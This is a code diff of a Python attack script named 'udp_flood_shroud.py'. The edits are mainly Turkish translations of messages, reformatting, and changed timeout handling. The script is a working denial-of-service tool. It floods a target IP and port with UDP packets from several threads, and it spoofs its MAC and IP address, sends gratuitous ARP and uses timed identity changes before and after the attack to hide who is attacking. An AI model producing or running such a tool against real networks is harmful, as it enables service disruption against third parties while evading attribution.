@@ -1,7 +1,15 @@
 #!/usr/bin/env python3
 # attack/udp_flood_shroud.py
 
-import argparse, random, socket, threading, time, signal, sys, subprocess, ipaddress
+import argparse
+import random
+import socket
+import threading
+import time
+import signal
+import sys
+import subprocess
+import ipaddress
 
 stop_event = threading.Event()
 
@@ -32,11 +40,10 @@ def random_ip(cidr, exclude):
 
 def disconnect_iface(iface):
     try:
-        run(["sudo", "iw", "dev", iface, "disconnect"])
-        print(f"[{time.strftime('%H:%M:%S')}] {iface} disassociated")
+        run(["sudo","iw","dev",iface,"disconnect"])
     except subprocess.CalledProcessError:
-    # Interface was already disconnected (or managed elsewhere) – proceed anyway
-        print(f"[!] Could not disconnect {iface} (maybe already down). Continuing.")
+        print(f"[!] Could not disconnect {iface} (belki zaten ayrılmıştı). Devam ediliyor.")
+
 def set_iface_mac(iface, mac):
     run(["sudo","ip","link","set","dev",iface,"down"])
     run(["sudo","ip","link","set","dev",iface,"address",mac])
@@ -47,7 +54,10 @@ def set_iface_ip(iface, ip, prefix):
     run(["sudo","ip","addr","add",f"{ip}/{prefix}","dev",iface])
 
 def gratuitous_arp(iface, ip):
-    run(["sudo","arping","-U","-c","3","-I",iface,ip])
+    try:
+        run(["sudo","arping","-U","-c","3","-I",iface,ip])
+    except subprocess.CalledProcessError:
+        print(f"[!] Gratuitous ARP atılamadı for {ip}. Devam ediliyor.")
 
 def udp_worker(target, port, size):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -57,16 +67,17 @@ def udp_worker(target, port, size):
         sock.sendto(payload, (target, port))
         sent += 1
         if sent % 1000 == 0:
-            print(f"[UDP] {sent} packets")
+            print(f"[UDP] {sent} paket gönderildi")
 
 def main():
     p = argparse.ArgumentParser("UDP Flood + MAC/IP Shroud w/ Delays")
-    p.add_argument("--iface", required=True, help="e.g. wlan0")
-    p.add_argument("target", help="Target IP")
-    p.add_argument("-p","--port", type=int, default=53)
-    p.add_argument("-s","--size", type=int, default=1024)
-    p.add_argument("-t","--threads", type=int, default=4)
-    p.add_argument("--timeout","-T", type=int , default=0, help="Auto-stop flood after N seconds (0 = manual Ctrl + C)")
+    p.add_argument("--iface", required=True, help="örn. wlan0")
+    p.add_argument("target", help="Hedef IP")
+    p.add_argument("-p","--port",   type=int, default=53,  help="Hedef port")
+    p.add_argument("-s","--size",   type=int, default=1024,help="Payload boyutu (byte)")
+    p.add_argument("-t","--threads",type=int, default=4,   help="Thread sayısı")
+    p.add_argument("-d","--timeout",type=int, default=None,
+                   help="Flood süresi (saniye). Belirtilmezse Ctrl+C ile durdurulur.")
     args = p.parse_args()
 
     # --- A: Orijinal kimlik ---
@@ -92,25 +103,18 @@ def main():
     print(f"[+] Flood {args.target}:{args.port} başlıyor")
     for _ in range(args.threads):
         t = threading.Thread(target=udp_worker,
-                             args=(args.target,args.port,args.size),
+                             args=(args.target, args.port, args.size),
                              daemon=True)
         t.start()
 
-    while not stop_event.is_set():
-        time.sleep(0.5)
-    if args.timeout > 0:
-        # Auto-stop after timeout
-        end = time.time() + args.timeout
-        while time.time() < end and not stop_event.is_set():
-            time.sleep(0.5)
+    if args.timeout:
+        # Belirtilen süre kadar flood, sonra otomatik dur
+        time.sleep(args.timeout)
         stop_event.set()
-        print(f"\n[!] Flood timeout ({args.timeout}s) reached, stopping.")
     else:
-        #Manual Ctrl-C
+        # Manuel Ctrl+C bekle
         while not stop_event.is_set():
             time.sleep(0.5)
-
-
 
     print("\n[!] Flood durduruluyor\n")
 
@@ -123,13 +127,14 @@ def main():
     print(f"=== C (Post-Attack) ===\n MAC: {mac_c}\n IP : {ip_c}/{prefix}\n")
 
     # --- C→D arası 5m23s bekle ---
-    print(f"[*] C→D arası 323s (5m23s) bekleniyor ({time.strftime('%H:%M:%S')})")
-    time.sleep(5*60 + 23)
+    wait = 5*60 + 23
+    print(f"[*] C→D arası {wait}s bekleniyor ({time.strftime('%H:%M:%S')})")
+    time.sleep(wait)
 
     # --- D: Cleanup spoof ---
     mac_d = random_mac()
     set_iface_mac(args.iface, mac_d)
-    print(f"=== D (Cleanup) ===\n MAC: {mac_d}\n (DHCP’ye dön veya manuel reconnection)\n")
+    print(f"=== D (Cleanup) ===\n MAC: {mac_d}\n (DHCP’ya dön ya da manuel reconnect yapın)\n")
 
     sys.exit(0)
 
